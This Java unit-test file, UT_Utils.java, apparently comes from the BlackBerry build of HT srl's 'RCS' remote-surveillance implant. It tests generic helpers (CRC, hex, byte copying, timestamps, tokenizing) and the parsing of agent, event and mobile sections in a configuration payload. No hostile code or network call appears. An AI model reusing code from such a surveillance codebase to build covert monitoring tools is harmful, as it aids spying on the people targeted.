//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_Utils.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;
import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import java.util.Random;
import java.util.TimeZone;
import java.util.Vector;

import net.rim.device.api.util.Arrays;
import tests.AssertException;
import tests.Data;
import tests.TestUnit;
import tests.Tests;
import blackberry.config.Conf;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.DoubleStringSortVector;
import blackberry.utils.StringSortVector;
import blackberry.utils.Utils;


/**
 * The Class UT_Utils.
 */
public final class UT_Utils extends TestUnit {

    /**
     * Instantiates a new u t_ utils.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_Utils(final String name, final Tests tests) {
        super(name, tests);
    }

    /**
     * Ascii test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean AsciiTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- AsciiTest --");
        //#endif

        AssertEqual(new Character(Utils.ascii(0)), new Character('0'),
                "ASCII(0)");
        AssertEqual(new Character(Utils.ascii(0xa)), new Character('A'),
                "ASCII(A)");
        AssertEqual(new Character(Utils.ascii(0xf)), new Character('F'),
                "ASCII(F)");

        return true;
    }

    /**
     * Copy test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    public boolean CopyTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- CopyTest --");
        //#endif

        // copia di uguali
        byte[] dest = new byte[123];
        final byte[] src = new byte[123];
        Arrays.fill(src, (byte) 0x0f);

        Utils.copy(dest, src, src.length);
        AssertThat(Arrays.equals(src, dest), "not equal 1");
        AssertThat(dest[0] == (byte) 0x0f, "not 0x0f");

        // copia da grande a piccolo
        dest = new byte[10];
        Utils.copy(dest, 0, src, 0, dest.length);

        final byte[] buffer = new byte[10];
        Arrays.fill(buffer, (byte) 0x0f);

        AssertThat(Arrays.equals(buffer, dest), "not equal 2");

        // copia di parte
        for (int i = 0; i < 10; i++) {
            src[i] = (byte) i;
        }

        Arrays.fill(dest, (byte) 0x0f);
        Utils.copy(dest, 3, src, 5, 2);

        for (int i = 0; i < 10; i++) {
            if (i == 3) {
                AssertThat(dest[i] == (byte) 5, "not 5");
            } else if (i == 4) {
                AssertThat(dest[i] == (byte) 6, "not 6");
            } else {
                AssertThat(dest[i] == 0x0f, "not 0x0f");
            }
        }

        return true;
    }

    /**
     * Crc test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean CrcTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- CrcTest --");
        //#endif

        byte[] buffer;
        int result, expected;

        // 1
        buffer = new byte[0];
        expected = 0x00;
        result = Utils.crc(buffer);
        AssertEqual(expected, result, "CRC1");

        // 2
        buffer = new byte[100];
        for (int i = 0; i < 100; i++) {
            buffer[i] = (byte) (i + 1);
        }

        final int[] results = new int[10];
        int[] expects = new int[] { 0x0, 0x1, 0x4, 0xf, 0x40, 0x145, 0x7a4,
                0x3583, 0x1ac20, 0xf0d29 };
        for (int i = 0; i < 10; i++) {
            results[i] = Utils.crc(buffer, 0, i);
            AssertEqual(expects[i], results[i], "CRC2 " + i);
        }

        expects = new int[] { 0x0, 0x9683a4, 0xfb58214c, 0x598075bf,
                0x9d9667b9, 0x8ed1cd81, 0x7493338, 0x7f3e6d8f, 0xc318e3b3,
                0x77617634 };
        for (int i = 0; i < 10; i++) {
            results[i] = Utils.crc(buffer, 0, i * 10);
        }

        for (int i = 0; i < 10; i++) {
            AssertEqual(expects[i], results[i], "CRC3 " + i);
        }

        // 3
        expected = 0xA3999D41;
        result = Utils.crc(Data.CONFIG_PAYLOAD);

        AssertEqual(expected, result, "CRC4");

        return true;
    }

    private void DateTimeTest() {
        //#ifdef DEBUG
        debug.info("-- DateTimeTest --");
        //#endif

        // 03/25/2010 11:53:34
        // sec from 1601 : 12913948414L
        // sec from 1970 : 1269474814L

        Date date = new Date(1269474814L * 1000);
        final Calendar calendar = Calendar.getInstance(TimeZone
                .getTimeZone("GMT"));
        calendar.setTime(date);

        //#ifdef DEBUG
        debug.info(calendar.toString());

        //#endif
        //#ifdef DBC
        Check.asserts(calendar.get(Calendar.YEAR) == 2010, "Wrong year");
        Check.asserts(calendar.get(Calendar.MONTH) == Calendar.MARCH,
                "Wrong Month");
        Check.asserts(calendar.get(Calendar.DAY_OF_MONTH) == 24, "Wrong Day");
        Check.asserts(calendar.get(Calendar.HOUR_OF_DAY) == 23, "Wrong Hour");
        Check.asserts(calendar.get(Calendar.MINUTE) == 53, "Wrong Minute");
        Check.asserts(calendar.get(Calendar.SECOND) == 34, "Wrong Second");
        //#endif

        final DateTime dateTime = new DateTime(date);

        final long hi = dateTime.hiDateTime();
        final long lo = dateTime.lowDateTime();
        final long timestamp = (hi << 32) + lo;
        final long ticks = dateTime.getFiledate();
        //#ifdef DBC
        Check.asserts(timestamp == ticks, "wrong timestamp 1");
        Check.asserts(timestamp == 12913948414L * DateTime.SECOND,
                "wrong timestamp 2");
        //#endif

        date = dateTime.getDate();
        calendar.setTime(date);
        //#ifdef DBC
        Check.asserts(calendar.get(Calendar.YEAR) == 2010, "Wrong year");
        Check.asserts(calendar.get(Calendar.MONTH) == Calendar.MARCH,
                "Wrong Month");
        Check.asserts(calendar.get(Calendar.DAY_OF_MONTH) == 24, "Wrong Day");
        Check.asserts(calendar.get(Calendar.HOUR_OF_DAY) == 23, "Wrong Hour");
        Check.asserts(calendar.get(Calendar.MINUTE) == 53, "Wrong Minute");
        Check.asserts(calendar.get(Calendar.SECOND) == 34, "Wrong Second");
        //#endif
    }

    /**
     * Double string sort vector test.
     * 
     * @throws AssertException
     *             the assert exception
     */
    void DoubleStringSortVectorTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- StringSortVectorTest --");
        //#endif

        final DoubleStringSortVector sv = new DoubleStringSortVector();
        sv.addElement("2", "Due");
        sv.addElement("3", "Tre");
        sv.addElement("1", "Uno");

        final Vector vector = sv.getValues();
        AssertEqual(vector.elementAt(0), "Uno", "Wrong Sort");
        AssertEqual(vector.elementAt(1), "Due", "Wrong Sort");
        AssertEqual(vector.elementAt(2), "Tre", "Wrong Sort");

    }

    /**
     * Gets the index test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean GetIndexTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- GetIndexTest --");
        //#endif

        final byte[] payload = Utils.charArrayToByteArray(Data.CONFIG_PAYLOAD);

        final int agentIndex = Utils.getIndex(payload,
                Conf.AGENT_CONF_DELIMITER.getBytes());
        final int eventIndex = Utils.getIndex(payload,
                Conf.EVENT_CONF_DELIMITER.getBytes());
        final int mobileIndex = Utils.getIndex(payload,
                Conf.MOBIL_CONF_DELIMITER.getBytes());
        final int actionIndex = Utils.getIndex(payload, "SICURAMENTENONCE"
                .getBytes());
        final int endofIndex = Utils.getIndex(payload,
                Conf.ENDOF_CONF_DELIMITER.getBytes());

        //#ifdef DEBUG
        debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
        debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
        debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
        debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
        //#endif

        AssertEqual(agentIndex, 280, "agentIndex");
        AssertEqual(eventIndex, 4, "eventIndex");
        AssertEqual(mobileIndex, 806, "mobileIndex");
        AssertEqual(actionIndex, -1, "actionIndex");
        AssertEqual(endofIndex, 914, "endofIndex");

        return true;
    }

    /**
     * Hex test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean HexTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- HexTest --");
        //#endif

        AssertEqual(new Integer(Utils.hex('0')), new Integer(0), "HEX(0)");
        AssertEqual(new Integer(Utils.hex('a')), new Integer(0xa), "HEX(A)");
        AssertEqual(new Integer(Utils.hex('f')), new Integer(0xf), "HEX(F)");

        return true;
    }

    /**
     * Int to byte test.
     * 
     * @throws AssertException
     *             the assert exception
     * @throws IOException
     *             Signals that an I/O exception has occurred.
     */
    public void IntToByteTest() throws AssertException, IOException {
        //#ifdef DEBUG
        debug.info("-- IntToByteTest --");
        //#endif

        final Random random = new Random();

        for (int i = 0; i > 0; i += random.nextInt(Integer.MAX_VALUE / 5)) {
            final byte[] arr = Utils.intToByteArray(i);
            final int value = Utils.byteArrayToInt(arr, 0);

            AssertEqual(value, i, "Not equals: " + i + " != " + value);
        }

        for (int i = Integer.MIN_VALUE; i <= Integer.MAX_VALUE / 2; i += random
                .nextInt(Integer.MAX_VALUE / 5)) {
            final byte[] arr = Utils.intToByteArray(i);

            final byte[] buffer = new byte[10];
            Utils.copy(buffer, 2, arr, 0, 4);

            final int value = Utils.byteArrayToInt(buffer, 2);

            AssertEqual(value, i, "Not equals, offset: " + i + " != " + value);

        }
    }

    /**
     * String sort vector test.
     * 
     * @throws AssertException
     *             the assert exception
     */
    void StringSortVectorTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- StringSortVectorTest --");
        //#endif

        final StringSortVector sv = new StringSortVector();
        sv.addElement("Uno");
        sv.addElement("Due");
        sv.addElement("Tre");

        sv.reSort();
        AssertEqual(sv.elementAt(0), "Due", "Wrong Sort");
        AssertEqual(sv.elementAt(1), "Tre", "Wrong Sort");
        AssertEqual(sv.elementAt(2), "Uno", "Wrong Sort");
    }

    private void StringSplit() throws AssertException {
        final String orig = ".1234..5678.9..";
        final String expected = "123456789";

        final String result = Utils.joinString(Utils.splitString(orig, "."));
        AssertThat(result.equals(expected), "StringSplit doesn't work");

    }

    private void TokenizeTest() throws AssertException {   
        String string = "  ciao   mondo";
        String firstWord = Utils.firstWord(string);
        AssertEqual("ciao", firstWord, "wrong firstWord");
        
        Vector vector = Utils.Tokenize("LOG zeno@whatever.com", " ");
        AssertEqual(vector.size(), 2, "Wrong size");
        AssertEqual(vector.elementAt(0), "LOG", "Wrong element 0");
        AssertEqual(vector.elementAt(1), "zeno@whatever.com", "Wrong element 0");

        vector = Utils.Tokenize("LOG SEND . zeno@whatever.com", " .@");
        AssertEqual(vector.size(), 5, "Wrong size");
        AssertEqual(vector.elementAt(0), "LOG", "Wrong element 0");
        AssertEqual(vector.elementAt(1), "SEND", "Wrong element 1");
        AssertEqual(vector.elementAt(2), "zeno", "Wrong element 2");
        AssertEqual(vector.elementAt(3), "whatever", "Wrong element 3");
        AssertEqual(vector.elementAt(4), "com", "Wrong element 4");

        vector = Utils.Tokenize("    .  ", " .@");
        AssertEqual(vector.size(), 0, "Wrong size");
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {

        TokenizeTest();
        DateTimeTest();
        GetIndexTest();
        CrcTest();
        HexTest();
        AsciiTest();
        CopyTest();
        StringSplit();
        StringSortVectorTest();
        DoubleStringSortVectorTest();

        try {
            IntToByteTest();
        } catch (final IOException e) {
            throw new AssertException();
        }

        return true;
    }

}
